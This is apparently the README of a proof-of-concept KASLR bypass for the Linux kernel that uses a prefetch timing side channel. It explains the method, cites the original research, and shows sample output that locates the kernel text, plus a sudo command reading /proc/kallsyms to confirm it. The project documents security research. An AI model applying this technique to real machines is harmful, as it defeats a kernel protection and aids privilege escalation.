KASLR bypass via prefetch side-channel
======================================

Note: dilettante implementation, better read [the original paper](https://gruss.cc/files/prefetch.pdf).

This is a proof-of-concept exploit for a KASLR bypass for the Linux kernel via timing the prefetch instruction.
Inspired by [a blogpost by Anders Fogh](http://dreamsofastone.blogspot.ru/2016/02/breaking-kasrl-with-micro-architecture.html).

The exploit works by measuring the time required to prefetch a particular address in the kernel space.
The idea is that a prefetch instruction is faster on virtual addresses which actually map to a page.
The used measuring approach is kind of best effort, but seems to be working.
See the source code for details.

The exploit was tested on a machine with Intel Core i7-4510 running Ubuntu 15.10 with 4.2.0-16-generic kernel and KASLR enabled.
Other setups might require other threshold values or a different number of measuring steps for the exploit to work.
I'd guess that it might not work at all for some CPUs.

Since [the KASLR for the Linux kernel is not really that random](https://lwn.net/Articles/569635/), the number of slots for the kernel text is quite limited, which allows to figure out the text location in a reasonable time.

Usage:
``` bash
$ python poc.py
0xffffffff80000000 0.8125
0xffffffff80000000 rejected
0xffffffff81000000 0.875
0xffffffff81000000 rejected
0xffffffff82000000 0.125
0xffffffff82000000 0.125
0xffffffff82000000 0.625
0xffffffff82000000 rejected
0xffffffff83000000 0.375
0xffffffff83000000 rejected
0xffffffff84000000 0.0625
0xffffffff84000000 0.0
0xffffffff84000000 0.0625
0xffffffff84000000 0.125
0xffffffff84000000 0.0625
0xffffffff84000000 rejected
0xffffffff85000000 0.25
0xffffffff85000000 0.0625
0xffffffff85000000 0.0
0xffffffff85000000 0.25
0xffffffff85000000 0.0625
0xffffffff85000000 rejected
0xffffffff86000000 0.875
0xffffffff86000000 rejected
0xffffffff87000000 0.875
0xffffffff87000000 rejected
0xffffffff88000000 0.375
0xffffffff88000000 rejected
0xffffffff89000000 0.125
0xffffffff89000000 0.9375
0xffffffff89000000 rejected
0xffffffff8a000000 0.3125
0xffffffff8a000000 rejected
0xffffffff8b000000 0.25
0xffffffff8b000000 0.1875
0xffffffff8b000000 0.875
0xffffffff8b000000 rejected
0xffffffff8c000000 0.5625
0xffffffff8c000000 rejected
0xffffffff8d000000 0.0
0xffffffff8d000000 0.0
0xffffffff8d000000 0.0
0xffffffff8d000000 0.0
0xffffffff8d000000 0.0
0xffffffff8d000000 accepted
the kernel is probably at 0xffffffff8d000000
```

You can confirm the kernel text address with:
``` bash
$ sudo cat /proc/kallsyms | grep 'T _text'
ffffffff8d000000 T _text
```
